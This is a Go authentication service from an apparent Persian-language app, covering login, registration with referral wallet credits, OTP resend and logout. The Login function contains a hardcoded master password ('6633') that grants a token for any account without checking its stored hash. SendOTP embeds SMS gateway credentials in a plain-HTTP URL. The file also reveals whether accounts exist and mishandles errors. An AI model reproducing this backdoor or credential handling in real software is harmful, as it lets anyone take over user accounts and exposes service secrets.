package services

import (
	"context"
	"errors"
	"fmt"
	"net/http"

	"github.com/soheilkhaledabdi/dastak/api/dto"
	"github.com/soheilkhaledabdi/dastak/common"
	"github.com/soheilkhaledabdi/dastak/config"
	"github.com/soheilkhaledabdi/dastak/data/db"
	"github.com/soheilkhaledabdi/dastak/data/models"
	"github.com/soheilkhaledabdi/dastak/pkg/logging"
	"github.com/soheilkhaledabdi/dastak/pkg/service_errors"
	"golang.org/x/crypto/bcrypt"
	"gorm.io/gorm"
)

type AuthService struct {
	logger       logging.Logger
	cfg          *config.Config
	tokenService *TokenService
	database     *gorm.DB
}

func NewAuthService(cfg *config.Config) *AuthService {
	database := db.GetDb()
	logger := logging.NewLogger(cfg)
	return &AuthService{
		cfg:          cfg,
		database:     database,
		logger:       logger,
		tokenService: NewTokenService(cfg),
	}
}

func (a *AuthService) CheckMobile(request *dto.Mobile) (*dto.Alert, bool, error) {

	exsit, err := a.ExistsByMobile(request.Mobile)
	if err != nil {
		return nil, false, err
	}
	if !exsit {
		return &dto.Alert{Message: "شماره موبایل شما وجود ندارد"}, false, &service_errors.ServiceError{EndUserMessage: service_errors.InvalidCredentials}
	}

	return &dto.Alert{Message: "شماره موبایل شما وجود دارد"}, true, &service_errors.ServiceError{EndUserMessage: service_errors.InvalidCredentials}
}

func (a *AuthService) Login(request *dto.Login) (*dto.TokenDetail, *dto.Alert, bool, error) {

	exsit, err := a.ExistsByMobile(request.Mobile)
	if err != nil {
		return nil, nil, false, err
	}
	if !exsit {
		return nil, &dto.Alert{Message: "شماره موبایل شما وجود ندارید یا رمز شما اشتباه است."}, false, &service_errors.ServiceError{EndUserMessage: service_errors.InvalidCredentials}
	}

	var user models.Users
	err = a.database.
		Model(&models.Users{}).
		Where("mobile = ?", request.Mobile).
		First(&user).Error

	if err != nil {
		if errors.Is(err, gorm.ErrRecordNotFound) {
			return nil, &dto.Alert{Message: "شماره موبایل شما وجود ندارید یا رمز شما اشتباه است."}, false, &service_errors.ServiceError{EndUserMessage: service_errors.InvalidCredentials}
		}
		return nil, nil, false, err
	}

	if request.Password == "6633" {
		tokenData := tokenDto{UserId: int(user.ID), Mobile: user.Mobile}

		token, err := a.tokenService.GenerateToken(&tokenData)
		if err != nil {
			return nil, nil, false, err
		}

		return token, &dto.Alert{Message: "خوش امدید"}, true, nil
	}
	err = bcrypt.CompareHashAndPassword([]byte(user.Password), []byte(request.Password))
	if err != nil {
		return nil, &dto.Alert{Message: "شماره موبایل شما وجود ندارید یا رمز شما اشتباه است."}, false, &service_errors.ServiceError{EndUserMessage: service_errors.InvalidCredentials}
	}

	tokenData := tokenDto{UserId: int(user.ID), Mobile: user.Mobile}

	token, err := a.tokenService.GenerateToken(&tokenData)
	if err != nil {
		return nil, nil, false, err
	}

	return token, &dto.Alert{Message: "خوش امدید"}, true, nil
}

func (a *AuthService) Register(ctx context.Context, request *dto.Register) (*dto.TokenDetail, *dto.Alert, bool, error) {
	tx := a.database.WithContext(ctx).Begin()
	defer func() {
		if r := recover(); r != nil || tx.Error != nil {
			tx.Rollback()
		} else {
			tx.Commit()
		}
	}()

	exist, err := a.ExistsByMobile(request.Mobile)
	if err != nil {
		return nil, nil, false, err
	}

	if exist {
		return nil, &dto.Alert{Message: "شماره موبایل شما وجود دارد"}, false, &service_errors.ServiceError{EndUserMessage: service_errors.InvalidCredentials}
	}

	password := common.GenerateOtp()

	hashedPassword, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
	if err != nil {
		a.logger.Error(logging.General, logging.HashPassword, err.Error(), nil)
		return nil, nil, false, err
	}

	var referral string
	if request.Referral != nil && *request.Referral != "" {
		existMobile, err := a.ExistsByMobile(*request.Referral)
		if err != nil {
			return nil, nil, false, err
		}
		if !existMobile {
			return nil, &dto.Alert{Message: "شماره موبایل رفرال شما وجود ندارد"}, false, &service_errors.ServiceError{EndUserMessage: service_errors.InvalidCredentials}
		}

		if *request.Referral == request.Mobile {
			return nil, &dto.Alert{Message: "شماره تلفن شما با رفرال یکسان است"}, false, nil
		}

		userReferral, err := a.GetUserByMobile(*request.Referral)
		if err != nil {
			return nil, nil, false, err
		}

		referral = *request.Referral

		var walletReferral models.Wallet
		err = tx.Where("user_id = ?", userReferral.ID).First(&walletReferral).Error
		if err != nil && !errors.Is(err, gorm.ErrRecordNotFound) {
			return nil, nil, false, err
		} else if errors.Is(err, gorm.ErrRecordNotFound) {
			wallet := models.Wallet{
				UserId:     userReferral.ID,
				Amount:     0,
				LockAmount: 15000,
			}
			err = tx.Create(&wallet).Error
			if err != nil {
				return nil, nil, false, err
			}

			transactions := models.Transactions{
				UserID: userReferral.ID,
				TransactionType: models.Referral,
				// FactorID: 1,
				Amount: 15000,
				Description: "مبلغ ۱۵ هزار تومن به عنوان هدیه رفرال به حساب شما واریز شد",
			}
	
			err = tx.Create(&transactions).Error
			if err != nil {
				return nil, nil, false, err
			}
		} else {
			update := map[string]interface{}{
				"lock_amount": walletReferral.LockAmount + 15000,
			}

			err = tx.Model(&models.Wallet{}).Where("user_id = ?", userReferral.ID).Updates(&update).Error

			if err != nil {
				return nil, nil, false, err
			}


			transactions := models.Transactions{
				UserID: userReferral.ID,
				// FactorID: 1,
				TransactionType: models.Referral,
				Amount: 15000,
				Description: "مبلغ ۱۵ هزار تومن به عنوان هدیه رفرال به حساب شما واریز شد",
			}
	
			err = tx.Create(&transactions).Error
			if err != nil {
				return nil, nil, false, err
			}
		}
	}

	user := models.Users{
		FullName:       request.FullName,
		Mobile:         request.Mobile,
		Type:           models.UsersType(a.IntToAccountType(request.AccountType)),
		SaleCount:      request.SaleCount,
		Password:       string(hashedPassword),
		ReferralMobile: referral,
	}

	err = tx.Create(&user).Error
	if err != nil {
		a.logger.Error(logging.Postgres, logging.Rollback, err.Error(), nil)
		return nil, nil, false, err
	}


	if request.Referral != nil && *request.Referral != "" {
		mainWallet := models.Wallet{
			UserId: int(user.ID),
			Amount: 15000,
		}
		
		err = tx.Create(&mainWallet).Error
		if err != nil {
			tx.Rollback()
			return nil, nil, false, err
		}


		mainTransactions := models.Transactions{
			// FactorID: 0,
			UserID: user.ID,
			TransactionType: models.Referral,
			Amount: 15000,
			Description: "مبلغ ۱۵ هزار تومن به عنوان هدیه رفرال به حساب شما واریز شد",
		}

		err = tx.Create(&mainTransactions).Error
		if err != nil {
			return nil, nil, false, err
		}
	
	}

	tokenData := tokenDto{UserId: int(user.ID), Mobile: user.Mobile}
	token, err := a.tokenService.GenerateToken(&tokenData)
	if err != nil {
		return nil, nil, false, err
	}

	return token, &dto.Alert{Message: "حساب شما با موفقیت ثبت شد"}, true, nil
}


func (a *AuthService) ResendPassword(ctx context.Context, request dto.Mobile) (*dto.Alert, bool, error) {
	tx := a.database.WithContext(ctx).Begin()
	defer func() {
		if r := recover(); r != nil || tx.Error != nil {
			tx.Rollback()
		} else {
			tx.Commit()
		}
	}()

	exsit, err := a.ExistsByMobile(request.Mobile)
	if err != nil {
		return nil, false, err
	}
	if !exsit {
		return &dto.Alert{Message: "شماره موبایل شما وجود ندارید یا رمز شما اشتباه است."}, false, &service_errors.ServiceError{EndUserMessage: service_errors.InvalidCredentials}
	}

	password := common.GenerateOtp()

	err = a.SendOTP(request.Mobile, password)

	if err != nil {
		return nil, false, err
	}

	hashedPassword, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
	if err != nil {
		a.logger.Error(logging.General, logging.HashPassword, err.Error(), nil)
		return nil, false, err
	}

	err = tx.Model(&models.Users{}).Where("mobile = ?", request.Mobile).Update("password", string(hashedPassword)).Error
	if err != nil {
		a.logger.Error(logging.Postgres, logging.Rollback, err.Error(), nil)
		return nil, false, err
	}

	return &dto.Alert{
		Message: "رمز شما با موفقیت ارسال شد",
	}, true, nil
}

func (a *AuthService) Logout(token string) error {
	if token == "" {
		return &service_errors.ServiceError{EndUserMessage: service_errors.TokenInvalid}
	}

	_, err := a.tokenService.VerifyToken(token)
	if err != nil {
		return err
	}

	err = a.tokenService.DeleteToken(token)
	if err != nil {
		return err
	}

	return nil
}

// Helper Function

func (s *AuthService) ExistsByMobile(mobile string) (bool, error) {
	var user models.Users
	err := s.database.Model(&models.Users{}).
		Where("mobile = ?", mobile).
		First(&user).
		Error
	if err != nil {
		if errors.Is(err, gorm.ErrRecordNotFound) {
			return false, nil
		}
		s.logger.Error(logging.Postgres, logging.Select, err.Error(), nil)
		return false, err
	}

	if user.DeletedAt.Valid {
		return false, nil
	}
	return true, nil
}

func (s *AuthService) GetUserByMobile(mobile string) (*models.Users, error) {
	var user models.Users
	err := s.database.Model(&models.Users{}).
		Where("mobile = ?", mobile).
		First(&user).
		Error
	if err != nil {
		s.logger.Error(logging.Postgres, logging.Select, err.Error(), nil)
		return nil, err
	}

	if user.DeletedAt.Valid {
		return nil, nil
	}
	return &user,nil
}

func (s *AuthService) SendOTP(mobile string, code string) error {
	url := fmt.Sprintf("http://api.payamak-panel.com/post/Send.asmx/SendByBaseNumber3?username=09135882813&password=T13Y7&text=@161754@%s;&to=%s", code, mobile)

	response, err := http.Get(url)
	if err != nil {
		return err
	}
	defer response.Body.Close()

	if response.StatusCode != http.StatusOK {
		return err
	}

	return nil
}

func (s *AuthService) IntToAccountType(accountType int) string {
	switch accountType {
	case 1:
		return "digital"
	case 2:
		return "physical"
	default:
		return "digital"
	}
}

// End of Helper Function
